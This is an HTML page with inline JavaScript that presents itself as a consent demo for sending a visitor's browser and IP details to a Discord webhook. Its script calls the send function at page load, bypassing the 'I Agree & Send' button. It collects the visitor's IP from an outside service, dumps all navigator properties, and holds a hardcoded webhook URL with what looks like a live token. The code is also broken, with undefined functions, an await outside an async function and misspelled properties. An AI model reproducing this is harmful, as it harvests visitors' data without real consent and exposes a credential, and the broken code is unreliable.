<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>User Info Demo</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="card">
    <h1>Send My Info</h1>
    <p>
      This will send basic browser and IP information to a Discord webhook.
    </p>
    <button id="sendBtn" onclick=sendinfo>I Agree & Send</button>
    <pre id="status"></pre>
  </div>

  <script>
    const WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1465917225818132575/eaIqusPShhtUlsTUlwmoZurmLcyFfqWrDsWSXe78jubMr4MSvFrR7siYeFWlIQ_aaqHm";

function collectClientInfo(ip) {
  let ip = "unavailable";

  try {
    const res = await fetch("https://api64.ipify.org?format=json", {
      cache: "no-store"
    });
    if (res.ok) {
      const data = await res.json();
      ip = data.ip || ip;
    }
  } catch {
    // silently ignore IP failure
  }
  const props = new Set();
  let obj = navigator;

  while (obj) {
    Object.getOwnPropertyNames(obj).forEach(p => props.add(p));
    obj = Object.getPrototypeOf(obj);
  }

  const navigatorDump = {};

  for (const key of [...props].sort()) {
    try {
      const value = navigator[key];
      navigatorDump[key] =
        typeof value === "object" && value !== null
          ? `[object ${value.constructor?.name || "Object"}]`
          : typeof value === "function"
          ? "[function]"
          : value;
    } catch {
      navigatorDump[key] = "[inaccessible]";
    }
  }

  return {
    ip,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toISOString(),
    navigator: navigatorDump,
    connectStart: window.preformance.connectStart
  };
}

var sendinfo = async () => {try {const info = await getUserInfo();await sendToDiscord(info);} catch (err) {}};
sendinfo();
  </script>
</body>
</html>
